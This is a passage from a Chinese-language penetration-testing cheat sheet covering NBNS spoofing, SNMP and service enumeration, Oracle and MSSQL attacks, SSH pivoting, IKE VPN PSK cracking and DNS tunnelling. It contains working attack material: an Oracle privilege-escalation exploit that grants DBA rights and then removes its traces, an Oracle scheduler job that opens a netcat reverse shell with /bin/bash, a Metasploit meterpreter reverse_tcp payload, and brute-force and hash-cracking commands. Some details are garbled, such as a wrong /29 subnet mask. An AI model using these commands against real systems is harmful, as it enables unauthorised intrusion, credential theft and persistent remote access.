class="line">auxiliary/spoof/nbns/nbns_response</span><br></pre></td></tr></table></figure><p>抓取哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/capture/smb</span><br><span class="line">auxiliary/server/capture/http_ntlm</span><br></pre></td></tr></table></figure><p>最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。</p><h5 id="Responder-py"><a href="#Responder-py" class="headerlink" title="Responder.py"></a>Responder.py</h5><p>你也可以选择使用 responder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SpiderLabs/Responder.git</span><br><span class="line">python Responder.py -i local-ip -I eth0</span><br></pre></td></tr></table></figure><p>注：整个渗透测试过程可以一直允许Responder.py</p><h4 id="SNMP枚举工具"><a href="#SNMP枚举工具" class="headerlink" title="SNMP枚举工具"></a>SNMP枚举工具</h4><p>SNMP枚举工具有很多。</p><p>美化SNMP输出结果使易于阅读。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp-mibs-downloader download-mibs</span><br><span class="line">echo &quot;&quot; &gt; /etc/snmp/snmp.conf</span><br></pre></td></tr></table></figure><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>snmpcheck -t 192.168.1.X -c public</code><br>` snmpwalk -c public -v1 192.168.1.X 1</td><td>grep hrSWRunName</td><td>cut -d<em> </em> -f  <code>&lt;br /&gt;</code> snmpenum -t 192.168.1.X <code>&lt;br /&gt;</code> onesixtyone -c names -i hosts `</td><td>SNMP枚举</td></tr></tbody></table><h5 id="SNMPv3枚举工具"><a href="#SNMPv3枚举工具" class="headerlink" title="SNMPv3枚举工具"></a>SNMPv3枚举工具</h5><p>使用nmap识别SNMPv3服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 161 --script=snmp-info TARGET-SUBNET</span><br></pre></td></tr></table></figure><p>Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp snmp-mibs-downloader</span><br><span class="line">wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</span><br></pre></td></tr></table></figure><p>注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">在GitHub上的安全列表</a> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</span><br></pre></td></tr></table></figure><h4 id="远程服务枚举"><a href="#远程服务枚举" class="headerlink" title="远程服务枚举"></a>远程服务枚举</h4><p>这已是老生常谈，但为了本文内容的全面还是包含如下。</p><p><code>nmap -A</code> 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。</p><h5 id="RSH-枚举"><a href="#RSH-枚举" class="headerlink" title="RSH 枚举"></a>RSH 枚举</h5><h6 id="RSH运行命令"><a href="#RSH运行命令" class="headerlink" title="RSH运行命令"></a>RSH运行命令</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsh &lt;target&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure><h6 id="MetasploitRSH-登陆扫描"><a href="#MetasploitRSH-登陆扫描" class="headerlink" title="MetasploitRSH 登陆扫描"></a>MetasploitRSH 登陆扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure><h6 id="使用rusers显示已登陆用户"><a href="#使用rusers显示已登陆用户" class="headerlink" title="使用rusers显示已登陆用户"></a>使用rusers显示已登陆用户</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rusers -al 192.168.2.1</span><br></pre></td></tr></table></figure><h6 id="使用rlogin扫描整个子网"><a href="#使用rlogin扫描整个子网" class="headerlink" title="使用rlogin扫描整个子网"></a>使用rlogin扫描整个子网</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l &lt;user&gt; &lt;target&gt;</span><br><span class="line">e.g rlogin -l root TARGET-SUBNET/24</span><br></pre></td></tr></table></figure><h4 id="使用finger枚举"><a href="#使用finger枚举" class="headerlink" title="使用finger枚举"></a>使用finger枚举</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">finger @TARGET-IP</span><br><span class="line">finger batman@TARGET-IP</span><br></pre></td></tr></table></figure><h5 id="利用Solaris的bug显示所有已登录用户"><a href="#利用Solaris的bug显示所有已登录用户" class="headerlink" title="利用Solaris的bug显示所有已登录用户"></a>利用Solaris的bug显示所有已登录用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">finger 0@host  </span><br><span class="line"></span><br><span class="line">SunOS: RPC services allow user enum:</span><br><span class="line">$ rusers # users logged onto LAN</span><br><span class="line"></span><br><span class="line">finger &apos;a b c d e f g h&apos;@sunhost</span><br></pre></td></tr></table></figure><h4 id="rwho"><a href="#rwho" class="headerlink" title="rwho"></a>rwho</h4><p>使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。</p><h2 id="TLS-amp-SSL-测试"><a href="#TLS-amp-SSL-测试" class="headerlink" title="TLS&amp;SSL 测试"></a>TLS&amp;SSL 测试</h2><h3 id="testssl-sh"><a href="#testssl-sh" class="headerlink" title="testssl.sh"></a>testssl.sh</h3><p>测试单一主机并将结果输出的HTML文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html</span><br></pre></td></tr></table></figure><h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>在Kali Rolling上安装OpenVAS 8 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br></pre></td></tr></table></figure><p>确认openvas  正在运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulpn</span><br></pre></td></tr></table></figure><p>通过<code>https://127.0.0.1:9392</code> 登陆openvas，密码是在安装时设置好的。</p><h2 id="数据库渗透测试"><a href="#数据库渗透测试" class="headerlink" title="数据库渗透测试"></a>数据库渗透测试</h2><p>攻击暴露在互联网上的数据库。</p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>安装 oscanner：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install oscanner</span><br></pre></td></tr></table></figure><p>运行 oscanner：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s 192.168.1.200 -P 1521</span><br></pre></td></tr></table></figure><h4 id="Oracle-TNS版本指纹识别"><a href="#Oracle-TNS版本指纹识别" class="headerlink" title="Oracle TNS版本指纹识别"></a>Oracle TNS版本指纹识别</h4><p>安装 tnscmd10g ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tnscmd10g</span><br></pre></td></tr></table></figure><p>识别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g version -h TARGET</span><br><span class="line">nmap --script=oracle-tns-version</span><br></pre></td></tr></table></figure><h4 id="爆破Oracle账户"><a href="#爆破Oracle账户" class="headerlink" title="爆破Oracle账户"></a>爆破Oracle账户</h4><p>验证默认账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure><p>对Oracle TNS 运行nmap脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1521 -A TARGET</span><br></pre></td></tr></table></figure><h4 id="Oracle权限提升"><a href="#Oracle权限提升" class="headerlink" title="Oracle权限提升"></a>Oracle权限提升</h4><p>利用条件：</p><ul><li>Oracle必须暴露在互联网上</li><li>使用默认账户，如scott</li></ul><p>简明流程：</p><ul><li>创建函数</li><li>创建表 SYS.DUAL  的索引</li><li>刚刚建立的索引执行了SCOTT.DBA_X 函数</li><li>函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户</li><li>创建具有DBA权限的账户</li></ul><p>下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。</p><h5 id="使用NMAP-NSE脚本验证oracle数据库中的默认账户："><a href="#使用NMAP-NSE脚本验证oracle数据库中的默认账户：" class="headerlink" title="使用NMAP NSE脚本验证oracle数据库中的默认账户："></a>使用NMAP NSE脚本验证oracle数据库中的默认账户：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure><p>使用脆弱账号登陆（假设你发现了一个）。</p><h5 id="确认一个oracle用户的权限级别"><a href="#确认一个oracle用户的权限级别" class="headerlink" title="确认一个oracle用户的权限级别"></a>确认一个oracle用户的权限级别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from session_privs; </span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid </span><br><span class="line">curren_user is </span><br><span class="line">pragma autonomous_transaction; </span><br><span class="line">begin </span><br><span class="line">execute immediate &apos;grant dba to user1 identified by pass1&apos;;</span><br><span class="line">commit;</span><br><span class="line">return &apos;FOO&apos;;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><h5 id="Oracle权限提升和访问DBA"><a href="#Oracle权限提升和访问DBA" class="headerlink" title="Oracle权限提升和访问DBA"></a>Oracle权限提升和访问DBA</h5><p>运行netcat，<code>netcat -nvlp 443</code> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&apos;BAR&apos;));</span><br></pre></td></tr></table></figure><h5 id="运行查询语句"><a href="#运行查询语句" class="headerlink" title="运行查询语句"></a>运行查询语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; Select * from session_privs;</span><br></pre></td></tr></table></figure><p>这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。</p><h5 id="移除利用痕迹："><a href="#移除利用痕迹：" class="headerlink" title="移除利用痕迹："></a>移除利用痕迹：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index exploit_1337;</span><br></pre></td></tr></table></figure><h5 id="获取Oracle反弹shell："><a href="#获取Oracle反弹shell：" class="headerlink" title="获取Oracle反弹shell："></a>获取Oracle反弹shell：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_scheduler.create_job( job_name    =&gt; &apos;MEH1337&apos;,job_type    =&gt;</span><br><span class="line">    &apos;EXECUTABLE&apos;,job_action =&gt; &apos;/bin/nc&apos;,number_of_arguments =&gt; 4,start_date =&gt;</span><br><span class="line">    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); </span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 1, &apos;TARGET-IP&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 2, &apos;443&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 3, &apos;-e&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 4, &apos;/bin/bash&apos;);</span><br><span class="line">dbms_scheduler.enable(&apos;rev_shell&apos;); </span><br><span class="line">end;</span><br></pre></td></tr></table></figure><h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>枚举/发现</p><p>Nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156</span><br></pre></td></tr></table></figure><p>Metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure><h4 id="爆破-MSSQL登陆"><a href="#爆破-MSSQL登陆" class="headerlink" title="爆破 MSSQL登陆"></a>爆破 MSSQL登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/mssql/mssql_enum</span><br></pre></td></tr></table></figure><h4 id="Metasploit-MSSQL-Shell"><a href="#Metasploit-MSSQL-Shell" class="headerlink" title="Metasploit MSSQL Shell"></a>Metasploit MSSQL Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/mssql/mssql_payload</span><br><span class="line">msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="Plink-exe-隧道"><a href="#Plink-exe-隧道" class="headerlink" title="Plink.exe 隧道"></a>Plink.exe 隧道</h3><p>PuTTY Link  隧道</p><p>转发运程端口到本地地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP</span><br></pre></td></tr></table></figure><h3 id="跳板（Pivoting）"><a href="#跳板（Pivoting）" class="headerlink" title="跳板（Pivoting）"></a>跳板（Pivoting）</h3><h4 id="SSH-跳板（ssh-Pivoting）"><a href="#SSH-跳板（ssh-Pivoting）" class="headerlink" title="SSH 跳板（ssh Pivoting）"></a>SSH 跳板（ssh Pivoting）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip</span><br></pre></td></tr></table></figure><p>需在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p><p>利用SSH跳板跨越网络</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1</span><br></pre></td></tr></table></figure><p>需在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2</span><br></pre></td></tr></table></figure><p>在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1011</code></p><h4 id="Meterpreter-Pivoting"><a href="#Meterpreter-Pivoting" class="headerlink" title="Meterpreter Pivoting"></a>Meterpreter Pivoting</h4><h3 id="TTL-指纹识别"><a href="#TTL-指纹识别" class="headerlink" title="TTL 指纹识别"></a>TTL 指纹识别</h3><table><thead><tr><th>操作系统</th><th>TTL 值</th></tr></thead><tbody><tr><td>Windows</td><td><code>128</code></td></tr><tr><td>Linux</td><td><code>64</code></td></tr><tr><td>Solaris</td><td><code>255</code></td></tr><tr><td>Cisco / Network</td><td><code>255</code></td></tr></tbody></table><h3 id="IPv4-速查"><a href="#IPv4-速查" class="headerlink" title="IPv4 速查"></a>IPv4 速查</h3><h4 id="各类IP的地址范围"><a href="#各类IP的地址范围" class="headerlink" title="各类IP的地址范围"></a>各类IP的地址范围</h4><table><thead><tr><th>类别</th><th>IP 地址范围</th></tr></thead><tbody><tr><td>A类</td><td><code>0.0.0.0 - 127.255.255.255</code></td></tr><tr><td>B类</td><td><code>128.0.0.0 - 191.255.255.255</code></td></tr><tr><td>C类</td><td><code>192.0.0.0 - 223.255.255.255</code></td></tr><tr><td>D类</td><td><code>224.0.0.0 - 239.255.255.255</code></td></tr><tr><td>E类</td><td><code>240.0.0.0 - 255.255.255.255</code></td></tr></tbody></table><h4 id="IPv4私有地址"><a href="#IPv4私有地址" class="headerlink" title="IPv4私有地址"></a>IPv4私有地址</h4><table><thead><tr><th>类别</th><th>范围</th></tr></thead><tbody><tr><td>A类私有地址</td><td><code>10.0.0.0 - 10.255.255.255</code></td></tr><tr><td>B类私有地址</td><td><code>172.16.0.0 - 172.31.255.255</code></td></tr><tr><td>C类私有地址</td><td><code>192.168.0.0 - 192.168.255.255</code></td></tr><tr><td></td><td><code>127.0.0.0 - 127.255.255.255</code></td></tr></tbody></table><h4 id="IPv4子网速查表"><a href="#IPv4子网速查表" class="headerlink" title="IPv4子网速查表"></a>IPv4子网速查表</h4><p>和渗透测试关系不太大，但确实很有用。</p><table><thead><tr><th>CIDR</th><th>十进制掩码</th><th>主机数量</th></tr></thead><tbody><tr><td>/31</td><td><code>255.255.255.254</code></td><td><code>1 Host</code></td></tr><tr><td>/30</td><td><code>255.255.255.252</code></td><td><code>2 Hosts</code></td></tr><tr><td>/29</td><td><code>255.255.255.249</code></td><td><code>6 Hosts</code></td></tr><tr><td>/28</td><td><code>255.255.255.240</code></td><td><code>14 Hosts</code></td></tr><tr><td>/27</td><td><code>255.255.255.224</code></td><td><code>30 Hosts</code></td></tr><tr><td>/26</td><td><code>255.255.255.192</code></td><td><code>62 Hosts</code></td></tr><tr><td>/25</td><td><code>255.255.255.128</code></td><td><code>126 Hosts</code></td></tr><tr><td>/24</td><td><code>255.255.255.0</code></td><td><code>254 Hosts</code></td></tr><tr><td>/23</td><td><code>255.255.254.0</code></td><td><code>512 Host</code></td></tr><tr><td>/22</td><td><code>255.255.252.0</code></td><td><code>1022 Hosts</code></td></tr><tr><td>/21</td><td><code>255.255.248.0</code></td><td><code>2046 Hosts</code></td></tr><tr><td>/20</td><td><code>255.255.240.0</code></td><td><code>4094 Hosts</code></td></tr><tr><td>/19</td><td><code>255.255.224.0</code></td><td><code>8190 Hosts</code></td></tr><tr><td>/18</td><td><code>255.255.192.0</code></td><td><code>16382 Hosts</code></td></tr><tr><td>/17</td><td><code>255.255.128.0</code></td><td><code>32766 Hosts</code></td></tr><tr><td>/16</td><td><code>255.255.0.0</code></td><td><code>65534 Hosts</code></td></tr><tr><td>/15</td><td><code>255.254.0.0</code></td><td><code>131070 Hosts</code></td></tr><tr><td>/14</td><td><code>255.252.0.0</code></td><td><code>262142 Hosts</code></td></tr><tr><td>/13</td><td><code>255.248.0.0</code></td><td><code>524286 Hosts</code></td></tr><tr><td>/12</td><td><code>255.240.0.0</code></td><td><code>1048674 Hosts</code></td></tr><tr><td>/11</td><td><code>255.224.0.0</code></td><td><code>2097150 Hosts</code></td></tr><tr><td>/10</td><td><code>255.192.0.0</code></td><td><code>4194302 Hosts</code></td></tr><tr><td>/9</td><td><code>255.128.0.0</code></td><td><code>8388606 Hosts</code></td></tr><tr><td>/8</td><td><code>255.0.0.0</code></td><td><code>16777214 Hosts</code></td></tr></tbody></table><h3 id="VLAN-hopping（跳跃攻击）"><a href="#VLAN-hopping（跳跃攻击）" class="headerlink" title="VLAN hopping（跳跃攻击）"></a>VLAN hopping（跳跃攻击）</h3><p>使用nccgroup 的脚本简化攻击过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/vlan-hopping.git</span><br><span class="line">chmod 700 frogger.sh</span><br><span class="line">./frogger.sh</span><br></pre></td></tr></table></figure><h3 id="VPN测试工具"><a href="#VPN测试工具" class="headerlink" title="VPN测试工具"></a>VPN测试工具</h3><p>识别VPN服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike TARGET(s)</span><br></pre></td></tr></table></figure><p>扫描VPN服务器网段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike -f ip.txt</span><br></pre></td></tr></table></figure><h4 id="IKEForce"><a href="#IKEForce" class="headerlink" title="IKEForce"></a>IKEForce</h4><p>使用IKEForce枚举或对 VPN 服务器进行字典攻击.</p><p>安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyip</span><br><span class="line">git clone https://github.com/SpiderLabs/ikeforce.git</span><br></pre></td></tr></table></figure><p>使用IKEForce对IKE VPN 进行枚举：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</span><br></pre></td></tr></table></figure><p>使用 IKEForce 爆破 IKE VPN:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ike-scan</span><br><span class="line">ike-scan TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key</span><br></pre></td></tr></table></figure><h4 id="IKE-激进模式-PSK-破解"><a href="#IKE-激进模式-PSK-破解" class="headerlink" title="IKE 激进模式 PSK 破解"></a>IKE 激进模式 PSK 破解</h4><ol><li>验证VPN服务器</li><li>使用 IKEForce 枚举来获得组ID</li><li>使用 ike-scan 从IKE 终端抓取 PSK 哈希 </li><li>使用 psk-crack 破解哈希</li></ol><h5 id="Step-1-验证IKE服务器"><a href="#Step-1-验证IKE服务器" class="headerlink" title="Step 1: 验证IKE服务器"></a>Step 1: 验证IKE服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike SUBNET/24</span><br></pre></td></tr></table></figure><h5 id="Step-2-使用IKEForce枚举组名"><a href="#Step-2-使用IKEForce枚举组名" class="headerlink" title="Step 2:使用IKEForce枚举组名"></a>Step 2:使用IKEForce枚举组名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</span><br></pre></td></tr></table></figure><h5 id="Step-3-使用ike-scan抓取PSK哈希"><a href="#Step-3-使用ike-scan抓取PSK哈希" class="headerlink" title="Step 3: 使用ike-scan抓取PSK哈希"></a>Step 3: 使用ike-scan抓取PSK哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP</span><br></pre></td></tr></table></figure><h5 id="Step-4-使用psk-crack-破解PSK-哈希"><a href="#Step-4-使用psk-crack-破解PSK-哈希" class="headerlink" title="Step 4: 使用psk-crack 破解PSK 哈希"></a>Step 4: 使用psk-crack 破解PSK 哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psk-crack hash-file.txt</span><br></pre></td></tr></table></figure><p>高级psk-crack 选项:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pskcrack</span><br><span class="line">psk-crack -b 5 TARGET-IPkey</span><br><span class="line">psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key</span><br><span class="line">psk-crack -d /path/to/dictionary-file TARGET-IP-key</span><br></pre></td></tr></table></figure><h4 id="PPTP-Hacking"><a href="#PPTP-Hacking" class="headerlink" title="PPTP Hacking"></a>PPTP Hacking</h4><p>验证PPTP服务 ，它以TCP协议在1723端口监听</p><h5 id="NMAP-PPTP-指纹识别"><a href="#NMAP-PPTP-指纹识别" class="headerlink" title="NMAP PPTP 指纹识别:"></a>NMAP PPTP 指纹识别:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –Pn -sV -p 1723 TARGET(S)</span><br></pre></td></tr></table></figure><h5 id="PPTP字典攻击"><a href="#PPTP字典攻击" class="headerlink" title="PPTP字典攻击"></a>PPTP字典攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</span><br></pre></td></tr></table></figure><h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。</p><h4 id="攻击机器："><a href="#攻击机器：" class="headerlink" title="攻击机器："></a>攻击机器：</h4><p>安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get -y install ruby-dev git make g++</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>运行dnscat2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 1422</span><br><span class="line">dnscat2&gt; session -i 1422</span><br></pre></td></tr></table></figure><p>目标机器:</p><p><a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> </p><p><a href="https://github.com/lukebaggett/dnscat2-powershell/" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure><h2 id="BOF-Exploit"><a href="#BOF-Exploit" class="headerlink" title="BOF / Exploit"></a>BOF / Exploit</h2><h2 id="Exploit-搜索"><a href="#Exploit-搜索" class="headerlink" title="Exploit 搜索"></a>Exploit 搜索</h2><p>寻找枚举主机/服务的exp</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>`searchsploit windows 2003</td><td>grep -i local`</td><td>从 exploit-db搜索EXP, 这里以WIndows2003本地提权为例</td></tr><tr><td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td><td>使用Google搜索exploit-db.com</td></tr><tr><td><code>grep -R &quot;W7&quot; /usr/share/metasploit-framework/modules/exploit/windows/*</code></td><td>用grep搜索metasploit的模块——因为msf的搜索有点差劲。</td></tr></tbody></table><h3 id="搜索EXP"><a href="#搜索EXP" class="headerlink" 